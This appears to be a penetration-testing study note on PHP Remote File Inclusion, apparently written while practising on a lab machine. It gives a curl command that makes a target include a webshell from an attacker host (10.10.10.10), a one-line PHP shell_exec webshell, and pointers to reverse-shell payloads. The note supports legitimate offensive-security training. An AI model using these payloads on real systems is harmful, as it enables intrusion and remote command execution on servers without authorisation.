Remote File Inclusion


The **allow_url_include** and **allow_url_fopen** option needs to be enabled for this attack to work 
- we can check for this in phpinfo.php
![[Pasted image 20260414200002.png]]


If the URL contains a page parameter, we can try this exploit
![[Pasted image 20260414200014.png]]

- also parameters such as; file=, lang=, view, load=, mod=

The 'include(test)' or a require() with this error message is a classic RFI target
![[Pasted image 20260414200029.png]]

We can upload webshells with this vulnerability and get command execution
Find php webshells in the **/usr/share/webshells/php** directory 

Exploit
1) Start a webserver in the webshell directory

2) Use curl to host the file 
```
curl http://[target]/index.php?page=http://10.10.10.10/simple-backdoor.php&cmd=ls
```
- We can also use php-reverse-shell.php, php Ivan Sincek shell or a msfvenom reverse shell if this payload doesn't work
Or use a simple php webshell
```
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > evil.txt
```

Working example in PG Slort(windows)